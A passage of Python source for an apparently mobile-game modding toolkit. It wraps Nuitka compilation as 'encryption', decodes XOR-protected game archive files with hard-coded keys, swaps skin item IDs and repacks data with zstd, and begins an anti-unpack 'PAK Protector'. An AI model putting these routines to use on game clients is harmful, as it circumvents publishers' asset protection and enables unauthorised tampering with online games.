MAX_COMPRESSION_LEVEL = 22
MAX_WORKERS = os.cpu_count() or 4
TARGET_SIZE = 65536

# Mini OBB Constants
MINI_PAK_FILE = "mini_obb.pak"
MINI_SIGNATURE = b"\xCD\xEE\x61\x2C"
MINI_EXPECTED_MAGIC = b"\x28\xB5\x2F\xFD"

# GamePatch Constants
SIG2KEY = {
    bytes.fromhex("9DC7"): bytes.fromhex("E55B4ED1"),
    bytes.fromhex("9D81"): bytes.fromhex("E51D4ED1"),
}

GZIP_HEADER = b"\x1F\x8B"
MAX_OFFSET_TRY = 8
MIN_RESULT_SIZE = 32
ZLIB_HEADERS = [b"\x78\x01", b"\x78\x5E", b"\x78\x9C", b"\x78\xDA"]

MAGIC_EXT = {
    0x9e2a83c1: ".uasset",
    0x61754c1b: ".lua",
    0x090a0d7b: ".dat",
    0x007bfeff: ".dat",
    0x200a0d7b: ".dat",
    0x27da0020: ".res",
    0x00000001: ".res",
    0x7bbfbbef: ".res",
    0x44484b42: ".bnk",
}

# Skin Tool File paths
MODSKIN_TXT = SKIN_TOOL_DIR / "modskin.txt"
NULL_TXT = SKIN_TOOL_DIR / "null.txt"
CHANGELOG_TXT = SKIN_TOOL_DIR / "changelog.txt"
NULLED_LOG_TXT = SKIN_TOOL_DIR / "nulled.txt"
HIT_TXT_PATH = SKIN_TOOL_DIR / "hit.txt"
ATTACH_TXT = SKIN_TOOL_DIR / "attach.txt"
LOGO_FILE = SKIN_TOOL_DIR / "logo.txt"
AUTO_THEME_LOBBY_FILE = SKIN_TOOL_DIR / "AUTO_THEME" / "TXT" / "lobby.txt"

# ==================== PYTHON ENCRYPTION TOOL (OPTION 16) ====================
# Integrated from 2.py - Python Script Encryption Tool v5.0

class EncryptionToolIntegrated:
    def __init__(self):
        self.version = "5.0.0"
        self.author = "Advanced Security Suite"
        self.base_dir = BASE_DIR / "ENCRYPTION_TOOL"
        self.input_dir = self.base_dir / "input"
        self.output_dir = self.base_dir / "output"
        self.logs_dir = self.base_dir / "logs"
        self.temp_dir = self.base_dir / "temp"
        self.config_file = self.base_dir / "config.json"
        self.is_termux = self.detect_termux()
        self.is_windows = platform.system() == "Windows"
        self.is_linux = platform.system() == "Linux"
        self.is_mac = platform.system() == "Darwin"
        
        # Create directories FIRST
        self.create_directories()
        
        # Then load config (which may create config.json)
        self.config = self.load_config()
        
        self.detected_files = {"python": [], "other": []}
    
    def detect_termux(self):
        """Detect if running in Termux environment"""
        try:
            if 'TERMUX_VERSION' in os.environ:
                return True
            if Path('/data/data/com.termux').exists():
                return True
            result = subprocess.run(['which', 'termux-setup-storage'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except:
            pass
        return False
    
    def load_config(self):
        """Load configuration from JSON file"""
        default_config = {
            "auto_install_deps": True,
            "keep_temp_files": False,
            "log_level": "INFO",
            "max_retries": 2,
            "timeout_seconds": 300,
            "termux_mode": self.is_termux,
            "use_nuitka_standalone": True,
            "cython_optimization": "O3",
            "validate_python": True
        }
        
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    for key in default_config:
                        if key not in config:
                            config[key] = default_config[key]
                    return config
            except:
                return default_config
        else:
            with open(self.config_file, 'w') as f:
                json.dump(default_config, f, indent=4)
            return default_config
    
    def save_config(self):
        """Save current configuration"""
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)
    
    def create_directories(self):
        """Create the required directory structure"""
        try:
            self.base_dir.mkdir(parents=True, exist_ok=True)
            self.input_dir.mkdir(parents=True, exist_ok=True)
            self.output_dir.mkdir(parents=True, exist_ok=True)
            self.logs_dir.mkdir(parents=True, exist_ok=True)
            self.temp_dir.mkdir(parents=True, exist_ok=True)
            
            # Create README files
            self.create_readme_files()
            self.create_sample_files()
            
        except Exception as e:
            console.print(f"[red]❌ Error creating directories: {e}[/red]")
    
    def create_sample_files(self):
        """Create sample files for testing"""
        sample_py = self.input_dir / "sample.py"
        
        if not sample_py.exists() and not any(self.input_dir.glob("*.py")):
            with open(sample_py, 'w') as f:
                f.write('''#!/usr/bin/env python3
"""
Sample Python Script for Encryption Testing
"""

import time
import sys

def main():
    print("="*50)
    print("Hello from encrypted Python script!")
    print(f"Python version: {sys.version}")
    print(f"Timestamp: {time.ctime()}")
    print("="*50)
    return 0

if __name__ == "__main__":
    sys.exit(main())
''')
            console.print(f"[green]✅ Created sample Python script: {sample_py}[/green]")
    
    def create_readme_files(self):
        """Create README files in directories"""
        input_readme = self.input_dir / "README.txt"
        output_readme = self.output_dir / "README.txt"
        
        if not input_readme.exists():
            with open(input_readme, 'w') as f:
                f.write("""╔═══════════════════════════════════════════════════════════════╗
║                    INPUT DIRECTORY                           ║
║                                                              ║
║  Place your .py scripts here for encryption                ║
║                                                              ║
║  Supported formats:                                         ║
║  • Python scripts (.py)                                     ║
║                                                              ║
║  Files will be automatically detected and processed         ║
║                                                              ║
║  Note: Files with other extensions will be ignored          ║
╚═══════════════════════════════════════════════════════════════╝""")
        
        if not output_readme.exists():
            with open(output_readme, 'w') as f:
                f.write("""╔═══════════════════════════════════════════════════════════════╗
║                   OUTPUT DIRECTORY                          ║
║                                                              ║
║  Encrypted files will be placed here                        ║
║                                                              ║
║  Encryption outputs:                                        ║
║  • Nuitka: Standalone executables                          ║
║                                                              ║
║  Each file gets its own folder with timestamp              ║
║                                                              ║
║  Logs are available in ../logs/ directory                  ║
╚═══════════════════════════════════════════════════════════════╝""")
    
    def log_message(self, message, level="INFO"):
        """Log message to file"""
        try:
            log_file = self.logs_dir / f"encryption_{datetime.now().strftime('%Y%m%d')}.log"
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open(log_file, 'a') as f:
                f.write(f"[{timestamp}] [{level}] {message}\n")
        except:
            pass
    
    def validate_python_syntax(self, file_path):
        """Validate Python syntax before encryption"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            compile(content, file_path.name, 'exec')
            ast.parse(content)
            
            return True, None
        except SyntaxError as e:
            lines = content.split('\n')
            start = max(0, e.lineno - 3)
            end = min(len(lines), e.lineno + 2)
            
            error_msg = f"Syntax error at line {e.lineno}: {e.msg}"
            context = []
            for i in range(start, end):
                prefix = ">>> " if i == e.lineno - 1 else "    "
                context.append(f"{prefix}{i+1}: {lines[i]}")
            
            return False, {
                'error': error_msg,
                'context': '\n'.join(context),
                'line': e.lineno
            }
        except Exception as e:
            return False, {'error': str(e)}
    
    def scan_input_directory(self):
        """Scan input directory and detect file types"""
        console.print("[cyan]🔍 Scanning input directory for files...[/cyan]")
        
        self.detected_files = {"python": [], "other": []}
        
        for file in self.input_dir.iterdir():
            if file.is_file() and not file.name.startswith('.'):
                if file.suffix == '.py':
                    if self.config.get('validate_python', True):
                        is_valid, error_info = self.validate_python_syntax(file)
                        if is_valid:
                            self.detected_files["python"].append(file)
                        else:
                            console.print(f"[yellow]⚠ File {file.name} has syntax errors:[/yellow]")
                            if error_info and 'context' in error_info:
                                console.print(f"[yellow]    {error_info['error']}[/yellow]")
                                console.print(f"[yellow]    Context:\n{error_info['context']}[/yellow]")
                            self.detected_files["other"].append(file)
                    else:
                        self.detected_files["python"].append(file)
                elif file.name not in ['README.txt', 'sample.py']:
                    self.detected_files["other"].append(file)
        
        # Display detected files
        console.print(f"\n[bold yellow]📁 DETECTED FILES:[/bold yellow]")
        console.print(f"  [green]🐍 Python scripts: {len(self.detected_files['python'])}[/green]")
        for f in self.detected_files['python']:
            console.print(f"    [cyan]- {f.name}[/cyan]")
        
        if self.detected_files['other']:
            console.print(f"  [yellow]📄 Other files: {len(self.detected_files['other'])}[/yellow]")
            for f in self.detected_files['other']:
                console.print(f"    [yellow]- {f.name} (skipped)[/yellow]")
        
        return len(self.detected_files['python'])
    
    def check_dependency(self, tool_name):
        """Check if a dependency is installed"""
        try:
            if tool_name == "nuitka":
                result = subprocess.run(["nuitka", "--version"], 
                                      capture_output=True, timeout=10)
                return result.returncode == 0
            elif tool_name == "gcc" or tool_name == "cc":
                result = subprocess.run(["gcc", "--version"],
                                      capture_output=True, timeout=5)
                if result.returncode != 0:
                    result = subprocess.run(["clang", "--version"],
                                          capture_output=True, timeout=5)
                return result.returncode == 0
        except:
            return False
        return False
    
    def install_dependency(self, tool_name):
        """Install a dependency"""
        if tool_name == "nuitka":
            console.print("[cyan]📦 Installing Nuitka (Strong encryption)...[/cyan]")
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", "-U", "nuitka"], 
                             check=True, capture_output=True, timeout=120)
                console.print("[green]✅ Nuitka installed successfully[/green]")
                return True
            except Exception as e:
                console.print(f"[red]❌ Failed to install Nuitka: {e}[/red]")
                return False
        return False
    
    def install_termux_deps(self):
        """Install Termux-specific dependencies"""
        console.print("[cyan]📦 Installing Termux build dependencies...[/cyan]")
        try:
            subprocess.run(["pkg", "update", "-y"], check=True, capture_output=True, timeout=60)
            subprocess.run(["pkg", "install", "python", "python-dev", "gcc", "make", "-y"], 
                         check=True, capture_output=True, timeout=180)
            console.print("[green]✅ Termux dependencies installed successfully[/green]")
            return True
        except Exception as e:
            console.print(f"[red]❌ Failed to install Termux dependencies: {e}[/red]")
            return False
    
    def encrypt_with_nuitka(self, input_file, output_name=None):
        """Encrypt Python script with Nuitka (Strong)"""
        try:
            console.print(f"[cyan]🔒 Encrypting {input_file.name} with Nuitka (Strong)...[/cyan]")
            
            if self.config.get('validate_python', True):
                is_valid, error_info = self.validate_python_syntax(input_file)
                if not is_valid:
                    console.print(f"[red]❌ Python file has syntax errors and cannot be encrypted:[/red]")
                    if error_info and 'context' in error_info:
                        console.print(f"[yellow]    {error_info['error']}[/yellow]")
                        console.print(f"[yellow]    Context:\n{error_info['context']}[/yellow]")
                    return False
            
            if not self.check_dependency("nuitka"):
                console.print("[yellow]⚠ Nuitka not found. Attempting to install...[/yellow]")
                if not self.install_dependency("nuitka"):
                    console.print("[red]❌ Cannot proceed without Nuitka[/red]")
                    return False
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            if output_name is None:
                output_name = f"{input_file.stem}_encrypted_{timestamp}"
            output_dir = self.output_dir / output_name
            output_dir.mkdir(parents=True, exist_ok=True)
            
            cmd = [
                "nuitka",
                "--show-progress",
                f"--output-dir={output_dir}",
                str(input_file)
            ]
            
            if not self.is_termux:
                cmd.extend(["--standalone", "--onefile"])
            
            if not self.is_termux:
                cmd.append("--lto=yes")
            
            if self.is_windows:
                cmd.append("--windows-disable-console")
            
            if self.is_termux:
                cmd.append("--jobs=1")
            
            console.print(f"[dim]Running: {' '.join(cmd)}[/dim]")
            self.log_message(f"Running command: {' '.join(cmd)}", "DEBUG")
            
            timeout = self.config.get('timeout_seconds', 3000)
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            start_time = time.time()
            while process.poll() is None:
                for line in process.stdout:
                    if line.strip():
                        if "Progress" in line or "%" in line:
                            console.print(f"    [dim]{line.strip()}[/dim]")
                        else:
                            console.print(f"    [cyan]{line.strip()}[/cyan]")
                
                if time.time() - start_time > timeout:
                    process.terminate()
                    console.print(f"[red]❌ Encryption timed out after {timeout} seconds[/red]")
                    return False
                
                time.sleep(0.1)
            
            stdout, stderr = process.communicate()
            if stdout:
                console.print(f"[cyan]{stdout}[/cyan]")
            if stderr:
                console.print(f"[yellow]{stderr}[/yellow]")
            
            if process.returncode == 0:
                built_files = list(output_dir.glob(f"{input_file.stem}*"))
                if built_files:
                    for f in built_files:
                        if f.is_file() and not f.suffix in ['.py', '.c', '.o']:
                            console.print(f"[green]✅ Encryption complete! Output: {f}[/green]")
                            return True
                console.print(f"[green]✅ Encryption complete! Check output directory: {output_dir}[/green]")
                return True
            else:
                console.print(f"[red]❌ Encryption failed with code {process.returncode}[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]❌ Error during encryption: {str(e)}[/red]")
            self.log_message(f"Nuitka error: {traceback.format_exc()}", "ERROR")
            return False
    
    def auto_detect_and_encrypt_nuitka(self):
        """Auto detect file types and encrypt with Nuitka"""
        total_files = self.scan_input_directory()
        
        if total_files == 0:
            console.print("[yellow]⚠ No valid Python files to encrypt![/yellow]")
            console.print("[cyan]💡 Please fix syntax errors in your files or disable validation in settings.[/cyan]")
            console.print("[cyan]💡 A sample file has been created for testing.[/cyan]")
            return
        
        console.print(f"\n[bold yellow]⚡ STARTING ENCRYPTION PROCESS (Nuitka)[/bold yellow]")
        console.print("[yellow]="*70+"[/yellow]")
        
        successful = 0
        failed = 0
        
        if self.detected_files["python"]:
            console.print(f"\n[cyan]🐍 Processing {len(self.detected_files['python'])} Python files with Nuitka...[/cyan]")
            for file in self.detected_files["python"]:
                console.print(f"\n[white]📄 {file.name} ({file.stat().st_size} bytes)[/white]")
                
                retries = self.config.get('max_retries', 2)
                success = False
                
                for attempt in range(retries):
                    if attempt > 0:
                        console.print(f"[yellow]⚠ Retry attempt {attempt+1}/{retries}[/yellow]")
                    
                    result = self.encrypt_with_nuitka(file)
                    
                    if result:
                        success = True
                        break
                    
                    time.sleep(1)
                
                if success:
                    successful += 1
                else:
                    failed += 1
        
        console.print(f"\n[yellow]="*70+"[/yellow]")
        console.print(f"[green]✅ ENCRYPTION COMPLETE![/green]")
        console.print(f"  [white]Successful: [green]{successful}[/green]")
        console.print(f"  [white]Failed: [red]{failed}[/red]")
        console.print(f"  [white]Total processed: [cyan]{successful + failed}[/cyan]")
        console.print(f"\n[cyan]📁 Output directory: {self.output_dir}[/cyan]")
        console.print(f"[cyan]📋 Logs directory: {self.logs_dir}[/cyan]")
        console.print("[cyan]="*70+"[/cyan]")
        
        self.log_message(f"Encryption completed: {successful} successful, {failed} failed", "INFO")
    
    def show_statistics(self):
        """Display statistics with pixel-style UI"""
        show_banner()
        
        py_files = list(self.input_dir.glob("*.py"))
        output_files = list(self.output_dir.glob("*"))
        
        output_dirs = [d for d in output_files if d.is_dir()]
        output_files_only = [f for f in output_files if f.is_file()]
        
        total_size = sum(f.stat().st_size for f in output_files if f.is_file())
        if total_size > 1024*1024:
            size_str = f"{total_size/(1024*1024):.2f} MB"
        elif total_size > 1024:
            size_str = f"{total_size/1024:.2f} KB"
        else:
            size_str = f"{total_size} bytes"
        
        stats_text = f"""[bold yellow]📊 ENCRYPTION STATISTICS[/bold yellow]
[cyan]{"─" * 40}[/]

[bold cyan]📥 Input:[/bold cyan]
  Python scripts: {len(py_files)}

[bold cyan]📤 Output:[/bold cyan]
  Directories: {len(output_dirs)}
  Files: {len(output_files_only)}
  Total size: {size_str}"""

        log_files = list(self.logs_dir.glob("*.log"))
        if log_files:
            latest_log = max(log_files, key=lambda x: x.stat().st_mtime)
            size = latest_log.stat().st_size / 1024
            stats_text += f"""

[bold cyan]📋 Latest Log:[/bold cyan]
  {latest_log.name} ({size:.2f} KB)"""

        console.print(Panel(
            stats_text,
            border_style="yellow",
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()
    
    def settings_menu(self):
        """Settings menu with pixel-style UI"""
        while True:
            try:
                show_banner()
                
                settings_panel = Panel(
                    f'[bold yellow]⚙️  SETTINGS[/bold yellow]\n[cyan]{"─" * 32}[/]\n\n'
                    f'[cyan]  1. Auto-install dependencies: [green]{self.config["auto_install_deps"]}[/green]\n'
                    f'[cyan]  2. Keep temporary files: [green]{self.config["keep_temp_files"]}[/green]\n'
                    f'[cyan]  3. Log level: {self.config["log_level"]}\n'
                    f'[cyan]  4. Max retries: {self.config["max_retries"]}\n'
                    f'[cyan]  5. Timeout seconds: {self.config["timeout_seconds"]}\n'
                    f'[cyan]  6. Validate Python syntax: [green]{self.config.get("validate_python", True)}[/green]\n'
                    f'[cyan]  8. Reset to defaults\n\n'
                    f'[bold red][0][/bold red] BACK TO MENU',
                    border_style="yellow",
                    padding=(1, 3),
                    box=box.ROUNDED
                )
                console.print(settings_panel)
                console.print()
                
                if self.is_termux:
                    console.print(f"[yellow]  📱 Termux Mode: {'Enabled' if self.config.get('termux_mode', True) else 'Disabled'}[/yellow]")
                    console.print()
                
                choice = input(f"\n[green]  Select option [0-8]: [/green]").strip()
                
                if choice == "1":
                    self.config['auto_install_deps'] = not self.config['auto_install_deps']
                    self.save_config()
                    console.print(f"[green]✅ Auto-install set to {self.config['auto_install_deps']}[/green]")
                    time.sleep(1)
                elif choice == "2":
                    self.config['keep_temp_files'] = not self.config['keep_temp_files']
                    self.save_config()
                    console.print(f"[green]✅ Keep temp files set to {self.config['keep_temp_files']}[/green]")
                    time.sleep(1)
                elif choice == "3":
                    levels = ["DEBUG", "INFO", "WARNING", "ERROR"]
                    console.print("\n[cyan]  Available log levels:[/cyan]")
                    for i, level in enumerate(levels, 1):
                        console.print(f"[white]    {i}. {level}[/white]")
                    try:
                        level_choice = int(input(f"\n[green]  Select log level: [/green]"))
                        if 1 <= level_choice <= len(levels):
                            self.config['log_level'] = levels[level_choice - 1]
                            self.save_config()
                            console.print(f"[green]✅ Log level set to {levels[level_choice - 1]}[/green]")
                            time.sleep(1)
                    except ValueError:
                        console.print("[red]❌ Invalid input![/red]")
                        time.sleep(1)
                elif choice == "4":
                    try:
                        retries = int(input(f"\n[cyan]  Enter max retries (1-5): [/cyan]"))
                        if 1 <= retries <= 5:
                            self.config['max_retries'] = retries
                            self.save_config()
                            console.print(f"[green]✅ Max retries set to {retries}[/green]")
                            time.sleep(1)
                    except ValueError:
                        console.print("[red]❌ Invalid input![/red]")
                        time.sleep(1)
                elif choice == "5":
                    try:
                        timeout = int(input(f"\n[cyan]  Enter timeout in seconds (60-600): [/cyan]"))
                        if 60 <= timeout <= 600:
                            self.config['timeout_seconds'] = timeout
                            self.save_config()
                            console.print(f"[green]✅ Timeout set to {timeout} seconds[/green]")
                            time.sleep(1)
                    except ValueError:
                        console.print("[red]❌ Invalid input![/red]")
                        time.sleep(1)
                elif choice == "6":
                    self.config['validate_python'] = not self.config.get('validate_python', True)
                    self.save_config()
                    console.print(f"[green]✅ Python validation set to {self.config['validate_python']}[/green]")
                    time.sleep(1)
                elif choice == "8":
                    confirm = input(f"\n[yellow]  Reset all settings to defaults? (y/n): [/yellow]")
                    if confirm.lower() == 'y':
                        self.config = {
                            "auto_install_deps": True,
                            "keep_temp_files": False,
                            "log_level": "INFO",
                            "max_retries": 2,
                            "timeout_seconds": 300,
                            "termux_mode": self.is_termux,
                            "use_nuitka_standalone": True,
                            "cython_optimization": "O3",
                            "validate_python": True
                        }
                        self.save_config()
                        console.print("[green]✅ Settings reset to defaults![/green]")
                        time.sleep(1)
                elif choice == "0":
                    break
                else:
                    console.print("[red]❌ Invalid choice![/red]")
                    time.sleep(1)
            except KeyboardInterrupt:
                break
    
    def install_dependencies_menu(self):
        """Install dependencies menu with pixel-style UI"""
        show_banner()
        
        deps_panel = Panel(
            f'[bold yellow]🛠️  INSTALL DEPENDENCIES[/bold yellow]\n[cyan]{"─" * 32}[/]\n\n'
            f'[bold green][1][/bold green] Install Nuitka           [bold yellow]➛ Strong encryption[/bold yellow]\n'
            f'[bold green][2][/bold green] Install Termux Tools    [bold yellow]➛ Build tools for mobile[/bold yellow]\n'
            f'[bold green][3][/bold green] Install All             [bold yellow]➛ Everything needed[/bold yellow]\n\n'
            f'[bold red][0][/bold red] BACK',
            border_style="yellow",
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(deps_panel)
        console.print()
        
        choice = input(f"\n[green]  Select option [0-3]: [/green]").strip()
        
        if choice == "1":
            self.install_dependency("nuitka")
            time.sleep(2)
        elif choice == "2" and self.is_termux:
            self.install_termux_deps()
            time.sleep(2)
        elif choice == "3":
            if self.is_termux:
                self.install_termux_deps()
            self.install_dependency("nuitka")
            console.print("[green]✅ All dependencies installed![/green]")
            time.sleep(2)
        elif choice == "0":
            return
        else:
            console.print("[red]❌ Invalid choice![/red]")
            time.sleep(1)
    
    def show_help(self):
        """Display help information with pixel-style UI"""
        show_banner()
        
        help_text = f"""[bold cyan]📖  ENCRYPTION TOOL HELP[/bold cyan]
[cyan]{"─" * 40}[/]

[bold yellow]🔒 ENCRYPTION METHOD:[/bold yellow]
  Nuitka (Strong)
  • Compiles Python to C
  • Creates standalone executable
  • Best for production deployment
  • Maximum security
  • Recommended for all platforms

[bold yellow]📁 DIRECTORY STRUCTURE:[/bold yellow]
  {self.base_dir}/
  ├── input/     ← Place your .py files here
  ├── output/    ← Encrypted files appear here
  ├── logs/      ← Activity logs
  └── temp/      ← Temporary files

[bold yellow]🔍 VALIDATION:[/bold yellow]
  • The tool validates Python syntax before encryption
  • Files with errors are skipped and reported
  • You can disable validation in Settings

[bold yellow]💡 TIPS:[/bold yellow]
  • Always backup your original files
  • Nuitka provides the strongest protection
  • Increase timeout for large files in settings
  • Fix syntax errors before encrypting"""

        if self.is_termux:
            help_text += """

[bold yellow]📱 TERMUX SPECIFIC NOTES:[/bold yellow]
  • Nuitka works well with -j1 flag
  • Use option 5 to install build tools first
  • Compilation may take longer on mobile"""

        console.print(Panel(
            help_text,
            border_style="cyan",
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()
    
    def interactive_menu(self):
        """Display integrated interactive menu with pixel-style UI"""
        while True:
            try:
                show_banner()
                
                # ── Encryption Tool Panel ────────────────────────────────────
                encryption_panel = Panel(
                    f'[bold cyan]🔐  PYTHON ENCRYPTION TOOL[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n'
                    f'[bold green][1][/bold green] ENCRYPT WITH NUITKA  [bold yellow]➛ Compile .py to executable[/bold yellow]\n'
                    f'[bold green][2][/bold green] VIEW STATISTICS      [bold yellow]➛ Check encryption stats[/bold yellow]\n'
                    f'[bold green][3][/bold green] SETTINGS             [bold yellow]➛ Configure tool options[/bold yellow]\n' 
                    f'[bold green][4][/bold green] HELP                 [bold yellow]➛ Documentation[/bold yellow]\n'
                    f'[bold green][5][/bold green] INSTALL DEPS         [bold yellow]➛ Install dependencies[/bold yellow]\n\n'
                    f'[bold red][0][/bold red] BACK TO MAIN MENU',
                    border_style="cyan",
                    padding=(1, 3),
                    box=box.ROUNDED
                )
                console.print(encryption_panel)
                console.print()
                
                if self.is_termux:
                    console.print("[yellow]  📱 Termux Mode - Optimized for mobile[/yellow]")
                    console.print()
                
                choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
                
                if choice == "1":
                    self.auto_detect_and_encrypt_nuitka()
                    Prompt.ask(f'\n[dim]Press Enter to continue...[/dim]', default='')
                elif choice == "2":
                    self.show_statistics()
                    Prompt.ask(f'\n[dim]Press Enter to continue...[/dim]', default='')
                elif choice == "3":
                    self.settings_menu()
                elif choice == "4":
                    self.show_help()
                    Prompt.ask(f'\n[dim]Press Enter to continue...[/dim]', default='')
                elif choice == "5":
                    self.install_dependencies_menu()
                    Prompt.ask(f'\n[dim]Press Enter to continue...[/dim]', default='')
                elif choice == "0":
                    break
                else:
                    console.print(Panel(
                        f'[bold red]❌ Option {choice} is invalid[/]',
                        title='[bold red]Error[/]',
                        border_style="red",
                        padding=(1, 2),
                        box=box.ROUNDED
                    ))
                    Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')
            except KeyboardInterrupt:
                console.print("\n[yellow]⚠ Operation cancelled[/yellow]")
                break
            except Exception as e:
                console.print(f"[red]❌ Unexpected error: {str(e)}[/red]")
                time.sleep(2)


def handle_encryption_tool_integrated():
    """Handle the integrated encryption tool"""
    tool = EncryptionToolIntegrated()
    tool.interactive_menu()

# ==================== SKIN TOOL HELPER FUNCTIONS ====================

def parse_id_pairs_skin(txt_path):
    """Parse ID pairs from modskin.txt."""
    pairs = []
    sep_re = re.compile(r'[\s,]+')
    
    try:
        with open(txt_path, encoding="utf-8") as f:
            for line_num, line in enumerate(f, 1):
                raw = line.strip()
                if not raw or raw.startswith('#'):
                    continue
                
                tokens = [t for t in sep_re.split(raw) if t != ""]
                if len(tokens) >= 2:
                    pairs.append((tokens[0], tokens[1]))
    except FileNotFoundError:
        console.print(f"[red]✖ File not found: {txt_path}[/red]")
    except Exception as e:
        console.print(f"[red]✖ Error reading {txt_path}: {e}[/red]")
    
    return pairs

def build_safe_pattern(ascii_id: bytes):
    return re.compile(rb"(?<![0-9])" + re.escape(ascii_id) + rb"(?![0-9])")

def pad_pattern(src: bytes, target_len: int) -> bytes:
    cur = bytearray(src)
    to_insert = target_len - len(cur)
    idx = cur.find(0x00)
    if idx < 0:
        cur.extend(b'\x00' * to_insert)
    else:
        for _ in range(to_insert):
            cur.insert(idx, 0x00)
    return bytes(cur)

def truncate_pattern(src: bytes, target_len: int) -> bytes:
    cur = bytearray(src)
    to_remove = len(cur) - target_len
    while to_remove > 0:
        idx = cur.find(0x00)
        if idx < 0:
            break
        del cur[idx]
        to_remove -= 1
    if to_remove > 0:
        del cur[-to_remove:]
    return bytes(cur)

def norm_hex(s: str) -> str:
    s = str(s).lower().strip()
    s = s[2:] if s.startswith("0x") else s
    return re.sub(r'[^0-9a-f]', '', s)

def valid_hex(s: str) -> bool:
    return bool(re.fullmatch(r'[0-9a-f]+', s)) and len(s) % 2 == 0

def looks_like_explicit_hex(token: str) -> bool:
    t = token.strip().lower()
    if t.startswith("0x"): 
        return True
    return bool(re.search(r'[a-f]', t))

def extract_level(name: str):
    LEVEL_RE = re.compile(r'\(?\s*lv\.?\s*[:.:]?\s*([0-9]+)\s*\)?|level\s*[:.:]?\s*([0-9]+)', re.I)
    m = LEVEL_RE.search(name)
    if not m: 
        return None
    for g in m.groups():
        if g: 
            return int(g)
    return None

def strip_level(name: str):
    name = re.sub(r'\(?\s*lv\.?\s*[:.:]?\s*[0-9]+\s*\)?', '', name, flags=re.I)
    name = re.sub(r'level\s*[:.:]?\s*[0-9]+', '', name, flags=re.I)
    return re.sub(r'\s+', ' ', name).strip().lower()

def gather_files(path):
    out = []
    if not os.path.exists(path):
        return out
    for r, _, files in os.walk(path):
        for fn in files:
            out.append(os.path.join(r, fn))
    return out

def size_fix_bytes(from_b: bytes, target_len: int):
    if len(from_b) == target_len: 
        return from_b, None
    if len(from_b) < target_len:
        return from_b + b'\x00' * (target_len - len(from_b)), "padded"
    return from_b[:target_len], "truncated"

def sanitize_rel(rel_path: str) -> str:
    parts = rel_path.split(os.sep)
    if parts and parts[0].lower() == "org":
        parts = parts[1:]
    if not parts:
        return os.path.basename(rel_path)
    return os.path.join(*parts)

def clean_modified(path):
    if os.path.exists(path):
        try:
            shutil.rmtree(path)
        except Exception as e:
            console.print(f"[yellow]Warning cleaning {path}: {e}[/yellow]")
    os.makedirs(path, exist_ok=True)

def compress_to_target_size(data: bytes, target_size: int) -> bytes:
    if target_size <= 0:
        return b""
    
    import zstandard as zstd
    levels = range(22, 0, -3)
    for level in levels:
        cctx = zstd.ZstdCompressor(level=level)
        compressed = cctx.compress(data)
        if len(compressed) <= target_size:
            return add_skippable_padding(compressed, target_size - len(compressed))
    
    return None

def add_skippable_padding(compressed: bytes, pad_len: int) -> bytes:
    if pad_len <= 0:
        return compressed
    
    result = bytearray(compressed)
    while pad_len > 0:
        frame_content_len = min(pad_len - 8, 1024 * 1024)
        if frame_content_len < 0:
            magic = b'\x50\x2A\x4D\x18'
            size_bytes = struct.pack('<I', 0)
            result.extend(magic + size_bytes)
            pad_len -= 8
        else:
            magic = b'\x50\x2A\x4D\x18'
            size_bytes = struct.pack('<I', frame_content_len)
            result.extend(magic + size_bytes + b'\x00' * frame_content_len)
            pad_len -= (8 + frame_content_len)
    
    return bytes(result)

def xor_feedback_block(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    out = np.empty(len(data), dtype=np.uint8)
    prev = np.zeros(key_len, dtype=np.uint8)
    arr = np.frombuffer(data, dtype=np.uint8)
    
    for i in range(len(arr)):
        if i < key_len:
            out[i] = arr[i] ^ key[i]
            prev[i] = out[i]
        else:
            k = i % key_len
            out[i] = arr[i] ^ prev[k]
            prev[k] = out[i]
    
    return out.tobytes()

def find_all_occurrences(data, pattern: bytes):
    return [m.start() for m in re.finditer(re.escape(pattern), data)]

def find_xor_key(sig4: bytes, magic4: bytes) -> bytes:
    return bytes([sig4[i] ^ magic4[i] for i in range(4)])

def prompt_modskin_format_short():
    console.print("[cyan]Auto-selected: C (INTERCHANGE / REVERSE)[/]")
    return "C"

# ==================== PAK PROTECTOR TOOL (FROM main.py) ====================
# Integrated PAK Protector - Anti-Unpack Protection for PAK files

def ensure_protector_dirs():
    """Create PAK Protector directories"""
    protector_dir = BASE_DIR / 'PAK_PROTECTOR'
    input_dir = protector_dir / 'INPUT'
    output_dir = protector_dir / 'RESULT'
    
    for d in [protector_dir, input_dir, output_dir]:
        d.mkdir(parents=True, exist_ok=True)
    
    return input_dir, output_dir


def find_pattern_positions(data: bytes, pattern: bytes) -> list:
    """Find all positions of a pattern in data"""
    positions = []
    pos = 0
    while True:
        pos = data.find(pattern, pos)
        if pos == -1:
            break
        positions.append(pos)
        pos += 1
    return positions


def is_safe_offset(offset: int, file_size: int) -> bool:
    """Check if offset is safe to modify (not near file boundaries)"""
    return 1000 < offset < file_size - 1000


def get_size_category(file_size: int) -> tuple:
    """Determine file size category and limits"""
    if file_size < 10 * 1024 * 1024:
        return "small", 100, 2000
    elif file_size < 100 * 1024 * 1024:
        return "medium", 1000, 50000
    else:
        return "large", 50000, 500000


def find_count_candidates(data: bytes, min_val: int, max_val: int, scan_regions: list) -> list:
    """Find candidate offsets for file count values"""
    candidates = []
    for region_start, region_end, desc in scan_regions:
        for offset in range(region_start, min(region_end, len(data) - 4), 4):
            val = struct.unpack('<I', data[offset:offset+4])[0]
            if min_val < val < max_val:
                ctx_start = max(0, offset - 64)
                ctx = data[ctx_start:offset]
                ctx_lower = ctx.lower()
